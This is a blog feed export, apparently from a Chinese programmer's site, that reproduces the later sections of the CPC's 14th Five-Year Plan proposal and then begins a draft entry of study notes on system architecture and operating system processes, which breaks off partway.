推动西部大开发形成新格局，推动东北振兴取得新突破，促进中部地区加快崛起，鼓励东部地区加快推进现代化。支持革命老区、民族地区加快发展，加强边疆地区建设，推进兴边富民、稳边固边。推进京津冀协同发展、长江经济带发展、粤港澳大湾区建设、长三角一体化发展，打造创新平台和新增长极。推动黄河流域生态保护和高质量发展。高标准、高质量建设雄安新区。坚持陆海统筹，发展海洋经济，建设海洋强国。健全区域战略统筹、市场一体化发展、区域合作互助、区际利益补偿等机制，更好促进发达地区和欠发达地区、东中西部和东北地区共同发展。完善转移支付制度，加大对欠发达地区财力支持，逐步实现基本公共服务均等化。</p><h2 id="31推进以人为核心的新型城镇化"><a class="markdownIt-Anchor" href="#31推进以人为核心的新型城镇化"></a> 31.推进以人为核心的新型城镇化</h2><p>  实施城市更新行动，推进城市生态修复、功能完善工程，统筹城市规划、建设、管理，合理确定城市规模、人口密度、空间结构，促进大中小城市和小城镇协调发展。强化历史文化保护、塑造城市风貌，加强城镇老旧小区改造和社区建设，增强城市防洪排涝能力，建设海绵城市、韧性城市。提高城市治理水平，加强特大城市治理中的风险防控。坚持房子是用来住的、不是用来炒的定位，租购并举、因城施策，促进房地产市场平稳健康发展。有效增加保障性住房供给，完善土地出让收入分配机制，探索支持利用集体建设用地按照规划建设租赁住房，完善长租房政策，扩大保障性租赁住房供给。深化户籍制度改革，完善财政转移支付和城镇新增建设用地规模与农业转移人口市民化挂钩政策，强化基本公共服务保障，加快农业转移人口市民化。优化行政区划设置，发挥中心城市和城市群带动作用，建设现代化都市圈。推进成渝地区双城经济圈建设。推进以县城为重要载体的城镇化建设。</p><h1 id="九-繁荣发展文化事业和文化产业提高国家文化软实力"><a class="markdownIt-Anchor" href="#九-繁荣发展文化事业和文化产业提高国家文化软实力"></a> 九、繁荣发展文化事业和文化产业，提高国家文化软实力</h1><p>  坚持马克思主义在意识形态领域的指导地位，坚定文化自信，坚持以社会主义核心价值观引领文化建设，加强社会主义精神文明建设，围绕举旗帜、聚民心、育新人、兴文化、展形象的使命任务，促进满足人民文化需求和增强人民精神力量相统一，推进社会主义文化强国建设。</p><h2 id="32提高社会文明程度"><a class="markdownIt-Anchor" href="#32提高社会文明程度"></a> 32.提高社会文明程度</h2><p>  推动形成适应新时代要求的思想观念、精神面貌、文明风尚、行为规范。深入开展习近平新时代中国特色社会主义思想学习教育，推进马克思主义理论研究和建设工程。推动理想信念教育常态化制度化，加强党史、新中国史、改革开放史、社会主义发展史教育，加强爱国主义、集体主义、社会主义教育，弘扬党和人民在各个历史时期奋斗中形成的伟大精神，推进公民道德建设，实施文明创建工程，拓展新时代文明实践中心建设。健全志愿服务体系，广泛开展志愿服务关爱行动。弘扬诚信文化，推进诚信建设。提倡艰苦奋斗、勤俭节约，开展以劳动创造幸福为主题的宣传教育。加强家庭、家教、家风建设。加强网络文明建设，发展积极健康的网络文化。</p><h2 id="33提升公共文化服务水平"><a class="markdownIt-Anchor" href="#33提升公共文化服务水平"></a> 33.提升公共文化服务水平</h2><p>  全面繁荣新闻出版、广播影视、文学艺术、哲学社会科学事业。实施文艺作品质量提升工程，加强现实题材创作生产，不断推出反映时代新气象、讴歌人民新创造的文艺精品。推进媒体深度融合，实施全媒体传播工程，做强新型主流媒体，建强用好县级融媒体中心。推进城乡公共文化服务体系一体建设，创新实施文化惠民工程，广泛开展群众性文化活动，推动公共文化数字化建设。加强国家重大文化设施和文化项目建设，推进国家版本馆、国家文献储备库、智慧广电等工程。传承弘扬中华优秀传统文化，加强文物古籍保护、研究、利用，强化重要文化和自然遗产、非物质文化遗产系统性保护，加强各民族优秀传统手工艺保护和传承，建设长城、大运河、长征、黄河等国家文化公园。广泛开展全民健身运动，增强人民体质。筹办好北京冬奥会、冬残奥会。</p><h2 id="34健全现代文化产业体系"><a class="markdownIt-Anchor" href="#34健全现代文化产业体系"></a> 34.健全现代文化产业体系</h2><p>  坚持把社会效益放在首位、社会效益和经济效益相统一，深化文化体制改革，完善文化产业规划和政策，加强文化市场体系建设，扩大优质文化产品供给。实施文化产业数字化战略，加快发展新型文化企业、文化业态、文化消费模式。规范发展文化产业园区，推动区域文化产业带建设。推动文化和旅游融合发展，建设一批富有文化底蕴的世界级旅游景区和度假区，打造一批文化特色鲜明的国家级旅游休闲城市和街区，发展红色旅游和乡村旅游。以讲好中国故事为着力点，创新推进国际传播，加强对外文化交流和多层次文明对话。</p><h2 id="十-推动绿色发展促进人与自然和谐共生"><a class="markdownIt-Anchor" href="#十-推动绿色发展促进人与自然和谐共生"></a> 十、推动绿色发展，促进人与自然和谐共生</h2><p>  坚持绿水青山就是金山银山理念，坚持尊重自然、顺应自然、保护自然，坚持节约优先、保护优先、自然恢复为主，守住自然生态安全边界。深入实施可持续发展战略，完善生态文明领域统筹协调机制，构建生态文明体系，促进经济社会发展全面绿色转型，建设人与自然和谐共生的现代化。</p><h2 id="35加快推动绿色低碳发展"><a class="markdownIt-Anchor" href="#35加快推动绿色低碳发展"></a> 35.加快推动绿色低碳发展</h2><p>  强化国土空间规划和用途管控，落实生态保护、基本农田、城镇开发等空间管控边界，减少人类活动对自然空间的占用。强化绿色发展的法律和政策保障，发展绿色金融，支持绿色技术创新，推进清洁生产，<code>发展环保产业</code>，推进重点行业和重要领域绿色化改造。推动能源清洁低碳安全高效利用。发展绿色建筑。开展绿色生活创建活动。降低碳排放强度，支持有条件的地方率先达到碳排放峰值，制定二〇三〇年前碳排放达峰行动方案。</p><h2 id="36持续改善环境质量"><a class="markdownIt-Anchor" href="#36持续改善环境质量"></a> 36.持续改善环境质量</h2><p>  增强全社会生态环保意识，深入打好污染防治攻坚战。继续开展污染防治行动，建立地上地下、陆海统筹的生态环境治理制度。强化多污染物协同控制和区域协同治理，加强细颗粒物和臭氧协同控制，基本消除重污染天气。治理城乡生活环境，推进城镇污水管网全覆盖，基本消除城市黑臭水体。推进化肥农药减量化和土壤污染治理，加强白色污染治理。加强危险废物医疗废物收集处理。完成重点地区危险化学品生产企业搬迁改造。重视新污染物治理。全面实行排污许可制，推进排污权、用能权、用水权、碳排放权市场化交易。完善环境保护、节能减排约束性指标管理。完善中央生态环境保护督察制度。积极参与和引领应对气候变化等生态环保国际合作。</p><h2 id="37提升生态系统质量和稳定性"><a class="markdownIt-Anchor" href="#37提升生态系统质量和稳定性"></a> 37.提升生态系统质量和稳定性</h2><p>  坚持山水林田湖草系统治理，构建以国家公园为主体的自然保护地体系。实施生物多样性保护重大工程。加强外来物种管控。强化河湖长制，加强大江大河和重要湖泊湿地生态保护治理，实施好长江十年禁渔。科学推进荒漠化、石漠化、水土流失综合治理，开展大规模国土绿化行动，推行林长制。推行草原森林河流湖泊休养生息，加强黑土地保护，健全耕地休耕轮作制度。加强全球气候变暖对我国承受力脆弱地区影响的观测，完善自然保护地、生态保护红线监管制度，开展生态系统保护成效监测评估。</p><h2 id="38全面提高资源利用效率"><a class="markdownIt-Anchor" href="#38全面提高资源利用效率"></a> 38.全面提高资源利用效率</h2><p>  健全自然资源资产产权制度和法律法规，加强自然资源调查评价监测和确权登记，建立生态产品价值实现机制，完善市场化、多元化生态补偿，推进资源总量管理、科学配置、全面节约、循环利用。实施国家节水行动，建立水资源刚性约束制度。提高海洋资源、矿产资源开发保护水平。完善资源价格形成机制。推行垃圾分类和减量化、资源化。加快构建废旧物资循环利用体系。</p><h1 id="十一-实行高水平对外开放开拓合作共赢新局面"><a class="markdownIt-Anchor" href="#十一-实行高水平对外开放开拓合作共赢新局面"></a> 十一、实行高水平对外开放，开拓合作共赢新局面</h1><p>  坚持实施更大范围、更宽领域、更深层次对外开放，依托我国大市场优势，促进国际合作，实现互利共赢。</p><h2 id="39建设更高水平开放型经济新体制"><a class="markdownIt-Anchor" href="#39建设更高水平开放型经济新体制"></a> 39.建设更高水平开放型经济新体制</h2><p>  全面提高对外开放水平，推动贸易和投资自由化便利化，推进贸易创新发展，增强对外贸易综合竞争力。完善外商投资准入前国民待遇加负面清单管理制度，有序扩大服务业对外开放，依法保护外资企业合法权益，健全促进和保障境外投资的法律、政策和服务体系，坚定维护中国企业海外合法权益，实现高质量引进来和高水平走出去。完善自由贸易试验区布局，赋予其更大改革自主权，稳步推进海南自由贸易港建设，建设对外开放新高地。稳慎推进人民币国际化，坚持市场驱动和企业自主选择，营造以人民币自由使用为基础的新型互利合作关系。发挥好中国国际进口博览会等重要展会平台作用。</p><h2 id="40推动共建一带一路高质量发展"><a class="markdownIt-Anchor" href="#40推动共建一带一路高质量发展"></a> 40.推动共建“一带一路”高质量发展</h2><p>  坚持共商共建共享原则，秉持绿色、开放、廉洁理念，深化务实合作，加强安全保障，促进共同发展。推进基础设施互联互通，拓展第三方市场合作。构筑互利共赢的产业链供应链合作体系，深化国际产能合作，扩大双向贸易和投资。坚持以企业为主体，以市场为导向，遵循国际惯例和债务可持续原则，健全多元化投融资体系。推进战略、规划、机制对接，加强政策、规则、标准联通。深化公共卫生、数字经济、绿色发展、科技教育合作，促进人文交流。</p><h2 id="41积极参与全球经济治理体系改革"><a class="markdownIt-Anchor" href="#41积极参与全球经济治理体系改革"></a> 41.积极参与全球经济治理体系改革</h2><p>  坚持平等协商、互利共赢，推动二十国集团等发挥国际经济合作功能。维护多边贸易体制，积极参与世界贸易组织改革，推动完善更加公正合理的全球经济治理体系。积极参与多双边区域投资贸易合作机制，推动新兴领域经济治理规则制定，提高参与国际金融治理能力。实施自由贸易区提升战略，构建面向全球的高标准自由贸易区网络。</p><h1 id="十二-改善人民生活品质提高社会建设水平"><a class="markdownIt-Anchor" href="#十二-改善人民生活品质提高社会建设水平"></a> 十二、改善人民生活品质，提高社会建设水平</h1><p>  坚持把实现好、维护好、发展好最广大人民根本利益作为发展的出发点和落脚点，尽力而为、量力而行，健全基本公共服务体系，完善<code>共建共治共享</code>的社会治理制度，扎实推动共同富裕，不断增强人民群众获得感、幸福感、安全感，促进人的全面发展和社会全面进步。</p><h2 id="42提高人民收入水平"><a class="markdownIt-Anchor" href="#42提高人民收入水平"></a> 42.提高人民收入水平</h2><p>  坚持按劳分配为主体、多种分配方式并存，提高劳动报酬在初次分配中的比重，完善工资制度，健全工资合理增长机制，着力提高低收入群体收入，扩大中等收入群体。完善按要素分配政策制度，健全各类生产要素由市场决定报酬的机制，探索通过土地、资本等要素使用权、收益权增加中低收入群体要素收入。多渠道增加城乡居民财产性收入。完善再分配机制，加大税收、社保、转移支付等调节力度和精准性，合理调节过高收入，取缔非法收入。发挥第三次分配作用，发展慈善事业，改善收入和财富分配格局。</p><h2 id="43强化就业优先政策"><a class="markdownIt-Anchor" href="#43强化就业优先政策"></a> 43.强化就业优先政策</h2><p>  千方百计稳定和扩大就业，坚持经济发展就业导向，扩大就业容量，提升就业质量，促进充分就业，保障劳动者待遇和权益。健全就业公共服务体系、劳动关系协调机制、终身职业技能培训制度。更加注重<code>缓解结构性就业矛盾</code>，加快提升劳动者技能素质，完善重点群体就业支持体系，统筹城乡就业政策体系。扩大公益性岗位安置，帮扶残疾人、零就业家庭成员就业。完善促进创业带动就业、多渠道灵活就业的保障制度，支持和规范发展新就业形态，健全就业需求调查和失业监测预警机制。</p><h2 id="44建设高质量教育体系"><a class="markdownIt-Anchor" href="#44建设高质量教育体系"></a> 44.建设高质量教育体系</h2><p>  全面贯彻党的教育方针，坚持立德树人，加强师德师风建设，培养德智体美劳全面发展的社会主义建设者和接班人。健全学校家庭社会协同育人机制，提升教师教书育人能力素质，增强学生文明素养、社会责任意识、实践本领，重视青少年身体素质和心理健康教育。坚持教育公益性原则，深化教育改革，促进教育公平，推动义务教育均衡发展和城乡一体化，完善普惠性学前教育和特殊教育、专门教育保障机制，鼓励高中阶段学校多样化发展。加大人力资本投入，增强职业技术教育适应性，深化职普融通、产教融合、校企合作，探索<code>中国特色学徒制</code>，大力培养技术技能人才。提高高等教育质量，分类建设一流大学和一流学科，加快培养理工农医类专业紧缺人才。提高民族地区教育质量和水平，加大国家通用语言文字推广力度。支持和规范民办教育发展，规范校外培训机构。发挥在线教育优势，完善终身学习体系，建设学习型社会。</p><h2 id="45健全多层次社会保障体系"><a class="markdownIt-Anchor" href="#45健全多层次社会保障体系"></a> 45.健全多层次社会保障体系</h2><p>  健全覆盖全民、统筹城乡、公平统一、可持续的多层次社会保障体系。推进社保转移接续，健全基本养老、基本医疗保险筹资和待遇调整机制。实现基本养老保险全国统筹，实施渐进式延迟法定退休年龄。发展多层次、多支柱养老保险体系。推动基本医疗保险、失业保险、工伤保险省级统筹，健全重大疾病医疗保险和救助制度，落实异地就医结算，稳步建立长期护理保险制度，积极发展商业医疗保险。健全灵活就业人员社保制度。健全退役军人工作体系和保障制度。健全分层分类的社会救助体系。坚持男女平等基本国策，保障妇女儿童合法权益。健全老年人、残疾人关爱服务体系和设施，完善帮扶残疾人、孤儿等社会福利制度。完善全国统一的社会保险公共服务平台。</p><h2 id="46全面推进健康中国建设"><a class="markdownIt-Anchor" href="#46全面推进健康中国建设"></a> 46.全面推进健康中国建设</h2><p>  把保障人民健康放在优先发展的战略位置，坚持预防为主的方针，深入实施健康中国行动，完善国民健康促进政策，织牢国家公共卫生防护网，为人民提供全方位全周期健康服务。改革疾病预防控制体系，强化监测预警、风险评估、流行病学调查、检验检测、应急处置等职能。建立稳定的公共卫生事业投入机制，加强人才队伍建设，改善疾控基础条件，完善公共卫生服务项目，强化基层公共卫生体系。落实医疗机构公共卫生责任，创新医防协同机制。完善突发公共卫生事件监测预警处置机制，健全医疗救治、科技支撑、物资保障体系，提高应对突发公共卫生事件能力。坚持基本医疗卫生事业公益属性，深化医药卫生体制改革，加快优质医疗资源扩容和区域均衡布局，加快建设分级诊疗体系，加强公立医院建设和管理考核，推进国家组织药品和耗材集中采购使用改革，发展高端医疗设备。支持社会办医，推广远程医疗。坚持中西医并重，大力发展中医药事业。提升健康教育、慢病管理和残疾康复服务质量，重视精神卫生和心理健康。深入开展爱国卫生运动，促进全民养成文明健康生活方式。完善全民健身公共服务体系。加快发展健康产业。</p><h2 id="47实施积极应对人口老龄化国家战略"><a class="markdownIt-Anchor" href="#47实施积极应对人口老龄化国家战略"></a> 47.实施积极应对人口老龄化国家战略</h2><p>  制定人口长期发展战略，优化生育政策，增强生育政策包容性，提高优生优育服务水平，发展普惠托育服务体系，降低生育、养育、教育成本，促进人口长期均衡发展，提高人口素质。积极开发老龄人力资源，发展<code>银发经济</code>。推动养老事业和养老产业协同发展，健全基本养老服务体系，发展普惠型养老服务和互助性养老，支持家庭承担养老功能，培育养老新业态，构建居家社区机构相协调、医养康养相结合的养老服务体系，健全养老服务综合监管制度。</p><h2 id="48加强和创新社会治理"><a class="markdownIt-Anchor" href="#48加强和创新社会治理"></a> 48.加强和创新社会治理</h2><p>  完善社会治理体系，健全党组织领导的自治、法治、德治相结合的城乡基层治理体系，完善基层民主协商制度，实现政府治理同社会调节、居民自治良性互动，建设<code>人人有责、人人尽责、人人享有</code>的社会治理共同体。发挥群团组织和社会组织在社会治理中的作用，畅通和规范市场主体、新社会阶层、社会工作者和志愿者等参与社会治理的途径。推动社会治理重心向基层下移，向基层放权赋能，加强城乡社区治理和服务体系建设，减轻基层特别是村级组织负担，加强基层社会治理队伍建设，构建网格化管理、精细化服务、信息化支撑、开放共享的基层管理服务平台。加强和创新市域社会治理，推进市域社会治理现代化。</p><h1 id="十三-统筹发展和安全建设更高水平的平安中国"><a class="markdownIt-Anchor" href="#十三-统筹发展和安全建设更高水平的平安中国"></a> 十三、统筹发展和安全，建设更高水平的平安中国</h1><p>  坚持总体国家安全观，实施国家安全战略，维护和塑造国家安全，统筹传统安全和非传统安全，把安全发展贯穿国家发展各领域和全过程，防范和化解影响我国现代化进程的各种风险，筑牢国家安全屏障。</p><h2 id="49加强国家安全体系和能力建设"><a class="markdownIt-Anchor" href="#49加强国家安全体系和能力建设"></a> 49.加强国家安全体系和能力建设</h2><p>  完善集中统一、高效权威的国家安全领导体制，健全国家安全法治体系、战略体系、政策体系、人才体系和运行机制，完善重要领域国家安全立法、制度、政策。健全国家安全审查和监管制度，加强国家安全执法。加强国家安全宣传教育，增强全民国家安全意识，巩固国家安全人民防线。坚定维护国家政权安全、制度安全、意识形态安全，全面加强网络安全保障体系和能力建设。严密防范和严厉打击敌对势力渗透、破坏、颠覆、分裂活动。</p><h2 id="50确保国家经济安全"><a class="markdownIt-Anchor" href="#50确保国家经济安全"></a> 50.确保国家经济安全</h2><p>  加强经济安全风险预警、防控机制和能力建设，实现重要产业、基础设施、战略资源、重大科技等关键领域安全可控。实施产业竞争力调查和评价工程，增强产业体系抗冲击能力。确保粮食安全，保障能源和战略性矿产资源安全。维护水利、电力、供水、油气、交通、通信、网络、金融等重要基础设施安全，提高水资源集约安全利用水平。维护金融安全，守住不发生系统性风险底线。确保生态安全，加强核安全监管，维护新型领域安全。构建海外利益保护和风险预警防范体系。</p><h2 id="51保障人民生命安全"><a class="markdownIt-Anchor" href="#51保障人民生命安全"></a> 51.保障人民生命安全</h2><p>  坚持人民至上、生命至上，把保护人民生命安全摆在首位，全面提高公共安全保障能力。完善和落实安全生产责任制，加强安全生产监管执法，有效遏制危险化学品、矿山、建筑施工、交通等重特大安全事故。强化生物安全保护，提高食品药品等关系人民健康产品和服务的安全保障水平。提升洪涝干旱、森林草原火灾、地质灾害、地震等自然灾害防御工程标准，加快江河控制性工程建设，加快病险水库除险加固，全面推进堤防和蓄滞洪区建设。完善国家应急管理体系，加强应急物资保障体系建设，发展巨灾保险，提高防灾、减灾、抗灾、救灾能力。</p><h2 id="52维护社会稳定和安全"><a class="markdownIt-Anchor" href="#52维护社会稳定和安全"></a> 52.维护社会稳定和安全</h2><p>  正确处理新形势下人民内部矛盾，坚持和发展新时代“<code>枫桥经验</code>”，畅通和规范群众诉求表达、利益协调、权益保障通道，完善信访制度，完善各类调解联动工作体系，构建源头防控、排查梳理、纠纷化解、应急处置的社会矛盾综合治理机制。健全社会心理服务体系和危机干预机制。坚持专群结合、群防群治，加强社会治安防控体系建设，坚决防范和打击暴力恐怖、黑恶势力、新型网络犯罪和跨国犯罪，保持社会和谐稳定。</p><h1 id="十四-加快国防和军队现代化实现富国和强军相统一"><a class="markdownIt-Anchor" href="#十四-加快国防和军队现代化实现富国和强军相统一"></a> 十四、加快国防和军队现代化，实现富国和强军相统一</h1><p>  贯彻习近平强军思想，贯彻新时代军事战略方针，坚持党对人民军队的绝对领导，坚持政治建军、改革强军、科技强军、人才强军、依法治军，加快机械化信息化智能化融合发展，全面加强练兵备战，提高捍卫国家主权、安全、发展利益的战略能力，确保二〇二七年实现建军百年奋斗目标。</p><h2 id="53提高国防和军队现代化质量效益"><a class="markdownIt-Anchor" href="#53提高国防和军队现代化质量效益"></a> 53.提高国防和军队现代化质量效益</h2><p>  加快军事理论现代化，与时俱进创新战争和战略指导，健全新时代军事战略体系，发展先进作战理论。加快军队组织形态现代化，深化国防和军队改革，推进军事管理革命，加快军兵种和武警部队转型建设，壮大战略力量和新域新质作战力量，打造高水平战略威慑和联合作战体系，加强军事力量联合训练、联合保障、联合运用。加快军事人员现代化，贯彻新时代军事教育方针，完善三位一体新型军事人才培养体系，锻造高素质专业化军事人才方阵。加快武器装备现代化，聚力国防科技自主创新、原始创新，加速战略性前沿性颠覆性技术发展，加速武器装备升级换代和智能化武器装备发展。</p><h2 id="54促进国防实力和经济实力同步提升"><a class="markdownIt-Anchor" href="#54促进国防实力和经济实力同步提升"></a> 54.促进国防实力和经济实力同步提升</h2><p>  同国家现代化发展相协调，搞好战略层面筹划，深化资源要素共享，强化政策制度协调，构建一体化国家战略体系和能力。推动重点区域、重点领域、新兴领域协调发展，集中力量实施国防领域重大工程。优化国防科技工业布局，加快标准化通用化进程。完善国防动员体系，健全强边固防机制，强化全民国防教育，巩固军政军民团结。</p><h1 id="十五-全党全国各族人民团结起来为实现十四五规划和二〇三五年远景目标而奋斗"><a class="markdownIt-Anchor" href="#十五-全党全国各族人民团结起来为实现十四五规划和二〇三五年远景目标而奋斗"></a> 十五、全党全国各族人民团结起来，为实现“十四五”规划和二〇三五年远景目标而奋斗</h1><p>  实现“十四五”规划和二〇三五年远景目标，必须坚持党的全面领导，充分调动一切积极因素，广泛团结一切可以团结的力量，形成推动发展的强大合力。</p><h2 id="55加强党中央集中统一领导"><a class="markdownIt-Anchor" href="#55加强党中央集中统一领导"></a> 55.加强党中央集中统一领导</h2><p>  贯彻党把方向、谋大局、定政策、促改革的要求，推动全党深入学习贯彻习近平新时代中国特色社会主义思想，增强“四个意识”、坚定“四个自信”、做到“两个维护”，完善上下贯通、执行有力的组织体系，确保党中央决策部署有效落实。落实全面从严治党主体责任、监督责任，提高党的建设质量。深入总结和学习运用中国共产党一百年的宝贵经验，教育引导广大党员、干部坚持共产主义远大理想和中国特色社会主义共同理想，不忘初心、牢记使命，为党和人民事业不懈奋斗。全面贯彻新时代党的组织路线，加强干部队伍建设，落实好干部标准，提高各级领导班子和干部适应新时代新要求抓改革、促发展、保稳定水平和专业化能力，加强对敢担当善作为干部的激励保护，以正确用人导向引领干事创业导向。完善人才工作体系，培养造就大批德才兼备的高素质人才。把严的主基调长期坚持下去，不断增强党自我净化、自我完善、自我革新、自我提高能力。锲而不舍落实中央八项规定精神，持续纠治形式主义、官僚主义，切实为基层减负。完善党和国家监督体系，加强政治监督，强化对公权力运行的制约和监督。坚持无禁区、全覆盖、零容忍，一体推进不敢腐、不能腐、不想腐，营造风清气正的良好政治生态。</p><h2 id="56推进社会主义政治建设"><a class="markdownIt-Anchor" href="#56推进社会主义政治建设"></a> 56.推进社会主义政治建设</h2><p>  坚持党的领导、人民当家作主、依法治国有机统一，推进中国特色社会主义政治制度自我完善和发展。坚持和完善人民代表大会制度，加强人大对“一府一委两院”的监督，保障人民依法通过各种途径和形式管理国家事务、管理经济文化事业、管理社会事务。坚持和完善中国共产党领导的多党合作和政治协商制度，加强人民政协专门协商机构建设，发挥社会主义协商民主独特优势，提高建言资政和凝聚共识水平。坚持和完善民族区域自治制度，全面贯彻党的民族政策，铸牢中华民族共同体意识，促进各民族共同团结奋斗、共同繁荣发展。全面贯彻党的宗教工作基本方针，积极引导宗教与社会主义社会相适应。健全基层群众自治制度，增强群众自我管理、自我服务、自我教育、自我监督实效。发挥工会、共青团、妇联等人民团体作用，把各自联系的群众紧紧凝聚在党的周围。完善大统战工作格局，促进政党关系、民族关系、宗教关系、阶层关系、海内外同胞关系和谐，巩固和发展大团结大联合局面。全面贯彻党的侨务政策，凝聚侨心、服务大局。坚持法治国家、法治政府、法治社会一体建设，完善以宪法为核心的中国特色社会主义法律体系，加强重点领域、新兴领域、涉外领域立法，提高依法行政水平，完善监察权、审判权、检察权运行和监督机制，促进司法公正，深入开展法治宣传教育，有效发挥法治固根本、稳预期、利长远的保障作用，推进法治中国建设。促进人权事业全面发展。</p><h2 id="57保持香港-澳门长期繁荣稳定"><a class="markdownIt-Anchor" href="#57保持香港-澳门长期繁荣稳定"></a> 57.保持香港、澳门长期繁荣稳定</h2><p>  全面准确贯彻“一国两制”、“港人治港”、“澳人治澳”、高度自治的方针，坚持依法治港治澳，维护宪法和基本法确定的特别行政区宪制秩序，落实中央对特别行政区全面管治权，落实特别行政区维护国家安全的法律制度和执行机制，维护国家主权、安全、发展利益和特别行政区社会大局稳定。支持特别行政区巩固提升竞争优势，建设国际创新科技中心，打造“一带一路”功能平台，实现经济多元可持续发展。支持香港、澳门更好融入国家发展大局，高质量建设粤港澳大湾区，完善便利港澳居民在内地发展政策措施。增强港澳同胞国家意识和爱国精神。支持香港、澳门同各国各地区开展交流合作。<code>坚决防范和遏制外部势力干预港澳事务</code>。</p><h2 id="58推进两岸关系和平发展和祖国统一"><a class="markdownIt-Anchor" href="#58推进两岸关系和平发展和祖国统一"></a> 58.推进两岸关系和平发展和祖国统一</h2><p>  坚持一个中国原则和“九二共识”，以两岸同胞福祉为依归，推动两岸关系和平发展、融合发展，加强两岸产业合作，打造两岸共同市场，壮大中华民族经济，共同弘扬中华文化。完善保障台湾同胞福祉和在大陆享受同等待遇的制度和政策，支持台商台企参与“一带一路”建设和国家区域协调发展战略，支持符合条件的台资企业在大陆上市，支持福建探索海峡两岸融合发展新路。加强两岸基层和青少年交流。<code>高度警惕和坚决遏制“台独”分裂活动</code>。</p><h2 id="59积极营造良好外部环境"><a class="markdownIt-Anchor" href="#59积极营造良好外部环境"></a> 59.积极营造良好外部环境</h2><p>  高举和平、发展、合作、共赢旗帜，坚持独立自主的和平外交政策，推进各领域各层级对外交往，推动构建新型国际关系和人类命运共同体。推进大国协调和合作，深化同周边国家关系，加强同发展中国家团结合作，积极发展全球伙伴关系。坚持多边主义和共商共建共享原则，积极参与全球治理体系改革和建设，<code>加强涉外法治体系建设</code>，加强国际法运用，维护以联合国为核心的国际体系和以国际法为基础的国际秩序，共同应对全球性挑战。积极参与重大传染病防控国际合作，推动构建人类卫生健康共同体。</p><h2 id="60健全规划制定和落实机制"><a class="markdownIt-Anchor" href="#60健全规划制定和落实机制"></a> 60.健全规划制定和落实机制</h2><p>  按照本次全会精神，制定国家和地方“十四五”规划纲要和专项规划，形成<code>定位准确</code>、<code>边界清晰</code>、<code>功能互补</code>、<code>统一衔接</code>的国家规划体系。健全政策协调和工作协同机制，完善规划实施监测评估机制，确保党中央关于“十四五”发展的决策部署落到实处。</p><p>  实现“十四五”规划和二〇三五年远景目标，意义重大，任务艰巨，前景光明。全党全国各族人民要紧密团结在以习近平同志为核心的党中央周围，同心同德，顽强奋斗，夺取全面建设社会主义现代化国家新胜利！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  “十四五”时期是我国全面建成小康社会、实现第一个百年奋斗目标之后，乘势而上开启全面建设社会主义现代化国家新征程、向第二个百年奋斗目标进军的第一个五年。中国共产党第十九届中央委员会第五次全体会议深入分析国际国内形势，就制定国民经济和社会发展“十四五”规划和二〇三五年远景目</summary>
      
    
    
    
    <category term="政策文件" scheme="https://coder.lufer.cc/categories/%E6%94%BF%E7%AD%96%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="读书笔记" scheme="https://coder.lufer.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    <category term="政策文件" scheme="https://coder.lufer.cc/tags/%E6%94%BF%E7%AD%96%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>系统架构设计师笔记(施工中)</title>
    <link href="https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B8%88%E7%AC%94%E8%AE%B0/"/>
    <id>https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B8%88%E7%AC%94%E8%AE%B0/</id>
    <published>2020-12-24T02:08:59.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<!-- # 第一章 绪论## 1.1 系统架构的概念及其发展历史### 1.1.1 系统架构的概念&emsp;&emsp;软件架构是关于软件系统的结构、行为和属性的高级抽象。在描述阶段，其对象是直接构成系统的抽象组件以及各个组件之间的连接规则，特别是相对细致的描述组件之间的通讯。在实现阶段，这些抽象化组件被细化为实际的组件，比如具体类或对象。软件系统架构不仅指定了软件系统的组织结构和拓扑结构，而且显示了系统需求和构成组件之间的对应关系，包括设计决策的基本方法和基本原理。# 第二章 计算机与网络基础知识## 2.1 操作系统基础知识### 2.1.1 操作系统的原理、类型与结构#### 1. 操作系统的定义&emsp;&emsp;操作系统（Operating System，OS）是计算机系统中的核心系统软件，负责管理和控制计算机系统中的硬件和软件资源，合理地组织计算机工作流程和有效地利用资源，在计算机与用户之间起接口的作用。&emsp;&emsp;操作系统的作用：  1. 通过资源管理，提高计算机系统的效率。2. 改善人机界面，向用户提供友好的工作环境。#### 2. 操作系统的分类&emsp;&emsp;操作系统按功能不同可以分为：* `单用户操作系统`和`批处理操作系统`* `分时操作系统`和`实时操作系统`* `网络操作系统`和`分布式操作系统`* `嵌入式操作系统`#### 3. 操作系统的特征* 并发性* 共享性* 虚拟性* 不确定性#### 4. 操作系统的功能* 进程管理* 文件管理* 存储管理* 设备管理* 作业管理### 2.1.2 处理机与进程管理#### 1. 进程的定义及其分类&emsp;&emsp;进程是资源分配和独立运行的基本单位，是程序的一次执行，通常由程序、数据及进程控制块(PCB)组成。PCB描述了进程的基本情况，是进程存在的唯一标志。&emsp;&emsp;进程与程序的区别：  &emsp;&emsp;程序是静态的指令序列，进程是为执行该程序的线程而保留的资源集。&emsp;&emsp;进程依性质不同可分为：* `系统进程`和`用户进程`* `父进程`和`子进程`#### 2. 进程的状态转换与控制&emsp;&emsp;进程有以下三种基本状态：1. 就绪状态  &emsp;&emsp;当进程已分配了除 CPU 以外的所有必要的资源后，只要能再获得处理机，便能立即执行，把这时的进程状态称为`就绪状态`。在一个系统中，可以有多个进程同时处于就绪状态，通常把它们排成一个队列，称为`就绪队列`。2. 执行状态  &emsp;&emsp;指进程已获得处理机，其程序正在执行。在单处理机系统中，只能有一个进程处于执行状态。3. 阻塞状态  &emsp;&emsp;指进程因发生某事件（如请求 I/O、申请缓冲空间等）而暂停执行时的状态，亦即进程的执行受到阻塞，故称这种暂停状态为`阻塞状态`，有时也称为`等待`状态或`睡眠`状态。通常将处于阻塞状态的进程排成一个队列，称为`阻塞队列`。下图是进程基本状态之间的转换图，也称为三态模型。![进程状态转换图](https://pic.lufer.cc/images/2021/03/15/roqSZ8.png)#### 